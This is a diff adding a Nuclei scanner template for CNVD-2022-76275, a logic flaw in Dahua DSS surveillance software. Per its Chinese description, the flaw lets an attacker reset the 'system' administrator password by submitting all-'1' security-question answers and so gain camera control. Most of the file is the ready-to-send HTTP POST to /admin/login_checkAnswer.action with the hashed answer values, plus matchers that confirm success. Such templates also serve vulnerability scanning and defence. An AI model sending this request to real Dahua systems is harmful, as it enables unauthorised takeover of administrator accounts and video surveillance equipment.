@@ -1,0 +1,48 @@
+id: CNVD-2022-76275
+
+info:
+  name: Dahua DSS - Any Password Reset
+  author: qwtd
+  severity: high
+  description: |
+    浙江大华技术股份有限公司DSS存在逻辑缺陷漏洞，攻击者可利用该漏洞重置系统密码，获取敏感信息。
+    在DSS登陆界面处，对于未设置密保问题的system用户，攻击者可填写密保问题答案全1从而实现重置system用户密码，进而获取系统最高权限，获取摄像头管理权限。
+  reference:
+    - https://github.com/adysec/nuclei_poc/blob/bda9b36688a5e5d44ce0d6994d6bb75ba9052135/poc/auth/Dahua_DSS_resetPassword.yaml#L3
+  tags: Dahua-DSS
+
+http:
+  - raw:
+      - |
+        POST /admin/login_checkAnswer.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+        Content-Length: 173
+        Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://{{Hostname}}/admin/login_login.action
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        userBean.questionAnswer1=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer2=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer3=a0b5d0071821c2d338d05f1127a1b93c
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "true"
+        condition: and
+
+      - type: status
+        status:
+          - 200
